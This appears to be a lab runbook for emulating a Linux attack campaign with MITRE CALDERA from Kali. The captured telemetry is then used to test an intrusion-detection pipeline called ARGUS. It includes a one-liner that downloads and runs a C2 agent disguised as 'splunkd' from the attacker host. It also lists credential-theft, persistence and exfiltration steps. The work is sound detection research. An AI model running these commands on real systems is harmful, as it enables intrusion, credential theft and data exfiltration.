# CALDERA on Kali — sophisticated Linux campaign → ARGUS test

Stand up a CITAR-depth, **real** adversary emulation from a Kali attacker box against a Linux
target, capture defender telemetry, and feed it through the ARGUS pipeline. CALDERA is the
tool CITAR itself was built with, so this reproduces CITAR-class sophistication on Linux.

> **Scope:** isolated lab only, against a target you own. No internet reachability from the
> target. This installs published tooling (MITRE CALDERA) and runs a standard emulation — not
> a bespoke attack script.

---

## 0. Lab topology

```
┌─────────────── isolated host-only / internal network ───────────────┐
│                                                                      │
│   Kali  (attacker + control)                 Target (victim, Linux)  │
│   ├─ CALDERA server  :8888                    ├─ vulnerable services  │
│   ├─ Metasploit / APT-Agent (initial access)  ├─ auditd (execve)  ◀── endpoint sensor
│   └─ tcpdump + Zeek (network sensor)          └─ Sandcat agent        │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

**Target recommendation:** use **Metasploitable 3 (Linux)** or a modern Ubuntu/Debian VM with
vulnerable services. Metasploitable **2** (Ubuntu 8.04, 2008) is great for *real initial
access* but too old to run a current CALDERA agent + auditd cleanly — keep M2 only as the
"pop the box" stage, then pivot the agent to a modern victim for the campaign.

---

## 1. Install CALDERA on Kali

```bash
sudo apt update
# golang-go compiles the Sandcat agents; nodejs+npm build the VueJS (Magma) front-end
sudo apt install -y git python3-pip python3-venv golang-go nodejs npm
node --version && npm --version          # want Node 16+
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
# first run compiles the agents + builds the UI (--build); --insecure uses conf/default.yml (lab creds)
python3 server.py --insecure --build
# later starts can skip the rebuild:  python3 server.py --insecure
```

> If `npm install` fails on a Node-version error, Kali's apt Node may be too old — install a
> current one via NodeSource or `nvm` (e.g. `nvm install 18`) and re-run `--build`.

Open the GUI at **http://127.0.0.1:8888** → log in as `red` / `admin` (from `conf/default.yml`;
change if you edited it). Grab the API key from `conf/default.yml` (`api_key_red:` / `api_key:`)
— you'll use it to download the report via the API.

## 2. Capture tooling on Kali (the network sensor)

```bash
sudo apt install -y tcpdump
# Zeek: if not in your repos, use the official Zeek APT repo (https://zeek.org) or a container.
zeek --version || echo "install Zeek before the run"
```

## 3. Prepare the target (the endpoint sensor)

On the **target**, turn auditd into your eCAR-equivalent process sensor:

```bash
sudo apt install -y auditd            # modern target; MS3 has it or installs easily
sudo tee /etc/audit/rules.d/execve.rules >/dev/null <<'EOF'
-a always,exit -F arch=b64 -S execve -k exec
-a always,exit -F arch=b32 -S execve -k exec
EOF
sudo augenrules --load || sudo auditctl -R /etc/audit/rules.d/execve.rules
sudo systemctl restart auditd
sudo auditctl -l                      # confirm the two execve rules are loaded
```

## 4. Initial access + deploy the CALDERA agent

**Real breach (optional, realistic):** use Metasploit/APT-Agent to get a session on the target,
then drop the agent through it. **Direct deploy (simplest):** run CALDERA's own Sandcat deploy
one-liner on the target, pointed at Kali's IP (GUI → *agents* → *Deploy an agent* → Sandcat →
linux gives you the exact command):

```bash
# ON THE TARGET — <KALI_IP> is your Kali box
server="http://<KALI_IP>:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red -v &
```

The agent registers as a "paw" in the GUI → *agents*. (Deploying via a real Metasploit session
instead of curl is the more faithful breach-then-dwell path.)

## 5. Build a CITAR-depth adversary profile

GUI → **adversaries** → *new profile* "APT-CITAR-Linux". Add abilities spanning the full chain
(filter the ability library by tactic + platform=linux), mirroring the CITAR ability list:

| Tactic | Example CALDERA abilities (Linux) |
|---|---|
| Discovery | System info, Process discovery, Network config, Local account, Find SUID files |
| Credential Access | `cat /etc/shadow`, search files for passwords, find SSH keys |
| Persistence | cron job, `.bashrc` hook, authorized_keys |
| Collection | Stage sensitive files |
| Staging | Archive collected data (tar/gzip) |
| Exfiltration | Exfil staged archive over C2 |
| Impact | (optional) encrypt staged copy / inhibit recovery |

Save. Prefer built-in, reversible abilities (they ship cleanup commands); keep destructive
"impact" abilities operating on a staging copy only.

## 6. Run the operation (with capture)

```bash
# ON KALI — start the network capture FIRST
sudo tcpdump -i <iface> -w /tmp/run/campaign.pcap "host <TARGET_IP>" &
```

GUI → **operations** → *new operation* → adversary = APT-CITAR-Linux, group = `red`,
planner = `atomic` (or `batch`), add **jitter** (e.g. 30/60s) to emulate dwell → **Start**.
Let it finish, then stop tcpdump (`sudo kill %1`).

## 7. Collect the artifacts

```bash
# ON KALI
mkdir -p /tmp/run/captured/zeek
# a) CALDERA operation report (ground truth) — <OP_ID> from the operations list, <KEY> from conf
curl -s -H "KEY:<API_KEY>" http://127.0.0.1:8888/api/v2/operations/<OP_ID>/report \
     -o /tmp/run/operation_report.json          # (or GUI → operation → Download report)
# b) Zeek over the capture
( cd /tmp/run/captured/zeek && zeek -r /tmp/run/campaign.pcap )
# c) target logs
scp <user>@<TARGET_IP>:/var/log/audit/audit.log /tmp/run/captured/audit.log
scp <user>@<TARGET_IP>:/var/log/auth.log        /tmp/run/captured/auth.log
```

## 8. Feed the ARGUS pipeline

From the ARGUS repo (`export PYTHONPATH="source code"` in your venv):

```bash
# ground truth from CALDERA's report
python tools/apt_capture/caldera_report.py /tmp/run/operation_report.json \
    --out /tmp/run/ground_truth.json

# package into an ARGUS case (note --audit: the endpoint sensor)
python tools/apt_capture/to_argus_case.py \
    --auth /tmp/run/captured/auth.log \
    --audit /tmp/run/captured/audit.log \
    --net  /tmp/run/captured/zeek/ \
    --ground-truth /tmp/run/ground_truth.json \
    --target-ip <TARGET_IP> --attacker-ip <KALI_IP> \
    --out cases_linux/caldera_run_001

# slice into CITAR-shaped, per-event-labelled windows
python tools/apt_capture/to_citar_windows.py \
    --case cases_linux/caldera_run_001 \
    --ground-truth /tmp/run/ground_truth.json \
    --attacker-ip <KALI_IP> --window-minutes 120 --name caldera --out cases_apt

# score it exactly like CITAR
python tools/eval_perevent.py --root cases_apt
```

## 9. Expect this result (and why)

Window-level: **MALICIOUS** (ARGUS flags the campaign window). Per-event recall: **~8%** — it
catches the brute force + C2/exfil flows and **misses the process-level kill chain**, because
ARGUS's behavioral primitives currently recognize *Windows* command verbs (`net`/`wmic`/`reg`),
not Linux (`id`/`cat /etc/shadow`/`tar`/`curl -T`). Porting `decompose()` + the P1 primitives to
Linux semantics is the change that makes this Linux test meaningful — do that before relying on
the per-event numbers.
```
```
